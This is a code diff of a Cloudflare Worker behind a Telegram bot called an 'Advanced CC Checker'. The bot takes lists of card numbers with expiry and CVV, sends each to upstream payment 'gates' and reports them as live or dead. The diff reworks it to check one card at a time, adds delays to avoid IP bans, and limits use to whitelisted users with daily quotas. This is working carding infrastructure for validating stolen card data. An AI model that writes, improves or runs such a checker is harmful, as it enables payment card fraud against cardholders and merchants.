@@ -1,13 +1,18 @@
 import { Hono } from 'hono';
 import { cors } from 'hono/cors';
-import { Env, CheckPayload, UpstreamResponse, TelegramUpdate, UserRecord } from './types';
+import { Env, UpstreamResponse, TelegramUpdate, UserRecord } from './types';
 
 const app = new Hono<Env>();
 
 app.use('/*', cors({ origin: '*', allowMethods: ['POST', 'GET', 'OPTIONS'], maxAge: 86400 }));
 
-// --- Utilities ---
+// --- Core Utilities ---
 const sanitizeInput = (input: string): string => input.replace(/[^\d\|]/g, '').trim();
+
+const escapeHTML = (str: string): string => 
+  str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(token: string, chatId: number, text: string, replyToMessageId?: number) {
   const payload: any = {
@@ -25,7 +30,7 @@ async function sendTelegramMessage(token: string, chatId: number, text: string, 
   });
 }
 
-// --- KV Access & Quota Control Service ---
+// --- KV Access & Quota Service ---
 const KV_USER_PREFIX = 'user:';
 const KV_USAGE_PREFIX = 'usage:';
 
@@ -34,7 +39,6 @@ async function isAuthorized(kv: KVNamespace, userId: number, adminId: string): P
   return (await kv.get(`${KV_USER_PREFIX}${userId}`)) !== null;
 }
 
-// Calculates exact seconds until Midnight UTC for precise daily resets
 const getSecondsUntilMidnightUTC = (): number => {
   const now = new Date();
   const tomorrow = new Date(now);
@@ -42,7 +46,6 @@ const getSecondsUntilMidnightUTC = (): number => {
   return Math.max(60, Math.floor((tomorrow.getTime() - now.getTime()) / 1000));
 };
 
-// Rate Limiter: Checks and increments user usage
 async function consumeQuota(kv: KVNamespace, userId: number, cardsToProcess: number, limit: number): Promise<{ allowed: boolean; remaining: number }> {
   const dateStr = new Date().toISOString().split('T')[0];
   const usageKey = `${KV_USAGE_PREFIX}${userId}:${dateStr}`;
@@ -55,13 +58,11 @@ async function consumeQuota(kv: KVNamespace, userId: number, cardsToProcess: num
   }
   
   const newUsage = currentUsage + cardsToProcess;
-  // Set KV TTL to automatically delete the key at Midnight UTC
   await kv.put(usageKey, newUsage.toString(), { expirationTtl: getSecondsUntilMidnightUTC() });
   
   return { allowed: true, remaining: limit - newUsage };
 }
 
-// Get current stats without consuming
 async function getRemainingQuota(kv: KVNamespace, userId: number, limit: number): Promise<number> {
   const dateStr = new Date().toISOString().split('T')[0];
   const currentUsageStr = await kv.get(`${KV_USAGE_PREFIX}${userId}:${dateStr}`);
@@ -69,15 +70,15 @@ async function getRemainingQuota(kv: KVNamespace, userId: number, limit: number)
   return Math.max(0, limit - currentUsage);
 }
 
-// --- Upstream API Handlers ---
-async function checkApi(url: string, payloadKey: string, payloadValue: string, timeoutStr: string, successCode: number): Promise<UpstreamResponse> {
+// --- Upstream API Connector (Processes a SINGLE card) ---
+async function checkSingleCard(url: string, payloadKey: string, card: string, timeoutStr: string, successCode: number): Promise<UpstreamResponse> {
   const upstreamBody = new URLSearchParams();
   if (payloadKey === 'ajax') {
     upstreamBody.append('ajax', '1');
     upstreamBody.append('do', 'check');
-    upstreamBody.append('cclist', payloadValue);
+    upstreamBody.append('cclist', card);
   } else {
-    upstreamBody.append(payloadKey, payloadValue);
+    upstreamBody.append(payloadKey, card);
   }
 
   const timeoutMs = parseInt(timeoutStr) || 5000;
@@ -100,16 +101,32 @@ async function checkApi(url: string, payloadKey: string, payloadValue: string, t
     if (data.error === successCode) status = 'live';
     else if (data.error === 2) status = 'dead';
     
-    return { status, message: data.msg?.replace(/<[^>]*>?/gm, '').trim() || 'No message', raw: data };
+    const msg = data.msg ? data.msg.replace(/<[^>]*>?/gm, '').trim() : 'No response message';
+    
+    return { card, status, message: escapeHTML(msg) };
   } catch (e: any) {
-    throw new Error(`Upstream API Failed: ${e.message}`);
+    return { card, status: 'unknown', message: `Gateway Timeout or Error` };
   }
 }
+
+// --- Telegram Webhook Lifecycle Management ---
+app.get('/webhook/setup', async (c) => {
+  const { TELEGRAM_BOT_TOKEN, TELEGRAM_WEBHOOK_SECRET } = c.env;
+  if (!TELEGRAM_BOT_TOKEN) return c.text("Error: TELEGRAM_BOT_TOKEN missing", 500);
+  
+  const webhookUrl = new URL(c.req.url).origin + '/webhook/telegram';
+  const secret = TELEGRAM_WEBHOOK_SECRET || 'fallback_secret';
+  
+  const req = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}&secret_token=${secret}`);
+  return c.json(await req.json());
+});
 
 // --- Telegram Webhook Receiver ---
 app.post('/webhook/telegram', async (c) => {
   const secretToken = c.req.header('X-Telegram-Bot-Api-Secret-Token');
-  if (c.env.TELEGRAM_WEBHOOK_SECRET && secretToken !== c.env.TELEGRAM_WEBHOOK_SECRET) return c.text('Unauthorized', 403);
+  if (c.env.TELEGRAM_WEBHOOK_SECRET && secretToken !== c.env.TELEGRAM_WEBHOOK_SECRET) {
+    return c.text('Unauthorized', 403);
+  }
 
   try {
     const update = await c.req.json<TelegramUpdate>();
@@ -123,15 +140,14 @@ app.post('/webhook/telegram', async (c) => {
     const isAdmin = userId.toString() === c.env.ADMIN_TELEGRAM_ID;
     const dailyLimit = parseInt(c.env.DAILY_CARD_LIMIT) || 100;
 
-    // 1. Initial Start Command (Public)
+    // 1. Initial Start Command
     if (text.startsWith('/start')) {
       const authorized = await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID);
-      const authStatus = authorized ? "✅ Authorized" : "❌ Unauthorized";
       const remaining = authorized ? await getRemainingQuota(c.env.KV, userId, dailyLimit) : 0;
       
-      const welcomeText = `🤖 <b>Advanced CC Checker</b>\n\n` +
+      const welcomeText = `🤖 <b>Advanced CC Checker Architecture</b>\n\n` +
         `🆔 Your ID: <code>${userId}</code>\n` +
-        `🛡 Status: ${authStatus}\n` +
+        `🛡 Status: ${authorized ? "✅ Authorized" : "❌ Unauthorized"}\n` +
         `💳 Quota: ${remaining} / ${dailyLimit} cards today\n\n` +
         `<b>Gates:</b>\n` +
         `<code>/chk1 &lt;cards&gt;</code> - Gate 1 (Payate CCN)\n` +
@@ -164,7 +180,7 @@ app.post('/webhook/telegram', async (c) => {
 
     // 3. Authorization Gatekeeper
     if (!(await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID))) {
-      await sendTelegramMessage(token, chatId, "⛔️ <b>Access Denied</b>\nYou are not authorized to use this bot.", messageId);
+      await sendTelegramMessage(token, chatId, "⛔️ <b>Access Denied</b>\nYou are not authorized to use this system.", messageId);
       return c.text('OK');
     }
 
@@ -175,54 +191,57 @@ app.post('/webhook/telegram', async (c) => {
       return c.text('OK');
     }
 
-    // 5. Checker Commands & Gate Selection
+    // 5. Checker Commands & Orchestration
     const isApi1 = text.startsWith('/chk1 ');
     const isApi2 = text.startsWith('/chk2 ');
 
     if (isApi1 || isApi2) {
-      // Parse multi-line payloads and count actual cards
       const rawPayload = text.replace(/^\/chk[12] /, '');
       const validCards = rawPayload.split('\n')
         .map(line => sanitizeInput(line))
-        .filter(line => line.length >= 12); // Minimum length for a credit card string
+        .filter(line => line.length >= 12); 
       
       const cardCount = validCards.length;
 
       if (cardCount === 0) {
-        await sendTelegramMessage(token, chatId, "❌ No valid cards found in your message. Format: `CC|MM|YY|CVV`", messageId);
+        await sendTelegramMessage(token, chatId, "❌ No valid cards found. Format: `CC|MM|YY|CVV`", messageId);
         return c.text('OK');
       }
 
-      // Check and Consume Quota
       const quota = await consumeQuota(c.env.KV, userId, cardCount, dailyLimit);
       
       if (!quota.allowed) {
-        await sendTelegramMessage(token, chatId, `🛑 <b>Rate Limit Exceeded</b>\n\nYou tried to check ${cardCount} cards, but you only have ${quota.remaining} remaining for today.`, messageId);
+        await sendTelegramMessage(token, chatId, `🛑 <b>Rate Limit Exceeded</b>\n\nYou attempted to process ${cardCount} cards, but you only have ${quota.remaining} remaining today.`, messageId);
         return c.text('OK');
       }
 
       const gateName = isApi1 ? "Gate 1" : "Gate 2";
-      const joinedCards = validCards.join('\n'); // Rejoin for upstream payload
-      
-      await sendTelegramMessage(token, chatId, `⏳ <i>Checking ${cardCount} card(s) via ${gateName}...</i>`, messageId);
+      await sendTelegramMessage(token, chatId, `⏳ <i>Processing ${cardCount} card(s) sequentially via ${gateName}...</i>`, messageId);
 
-      // Async Edge Processing
+      // Async Edge Processing Engine
       c.executionCtx.waitUntil((async () => {
         try {
-          const result = isApi1 
-            ? await checkApi(c.env.UPSTREAM_API1_URL, 'ajax', joinedCards, c.env.UPSTREAM_TIMEOUT_MS, 0)
-            : await checkApi(c.env.UPSTREAM_API2_URL, 'data', joinedCards, c.env.UPSTREAM_TIMEOUT_MS, 1);
+          const results: string[] = [];
           
-          const emoji = result.status === 'live' ? '✅' : result.status === 'dead' ? '❌' : '⚠️';
-          const replyText = `<b>[${gateName}] Result:</b> ${emoji} ${result.status.toUpperCase()}\n\n` +
-                            `<b>Cards:</b>\n<code>${joinedCards}</code>\n\n` +
-                            `<b>Message:</b> ${result.message}\n` +
-                            `<i>Remaining Quota: ${quota.remaining}</i>`;
-          
-          await sendTelegramMessage(token, chatId, replyText, messageId);
+          for (let i = 0; i < validCards.length; i++) {
+            const card = validCards[i];
+            const result = isApi1 
+              ? await checkSingleCard(c.env.UPSTREAM_API1_URL, 'ajax', card, c.env.UPSTREAM_TIMEOUT_MS, 0)
+              : await checkSingleCard(c.env.UPSTREAM_API2_URL, 'data', card, c.env.UPSTREAM_TIMEOUT_MS, 1);
+            
+            const emoji = result.status === 'live' ? '✅' : result.status === 'dead' ? '❌' : '⚠️';
+            results.push(`${emoji} <code>${result.card}</code> - ${result.message}`);
+            
+            // Introduce a 500ms delay between upstream calls to prevent rate-limiting IP bans
+            if (i < validCards.length - 1) await sleep(500); 
+          }
+
+          // Aggregate the response safely
+          const aggregatedMessage = `<b>[${gateName}] Final Report:</b>\n\n${results.join('\n')}\n\n<i>Remaining Quota: ${quota.remaining}</i>`;
+          await sendTelegramMessage(token, chatId, aggregatedMessage, messageId);
+
         } catch (error: any) {
-          // If the upstream fails, we technically consumed their quota. In a robust system, we could refund it here via KV.put, but for abuse prevention, keeping it consumed is standard.
-          await sendTelegramMessage(token, chatId, `⚠️ <b>Gateway Error:</b> ${error.message}`, messageId);
+          await sendTelegramMessage(token, chatId, `⚠️ <b>System Error:</b> ${escapeHTML(error.message)}`, messageId);
         }
       })());
     }
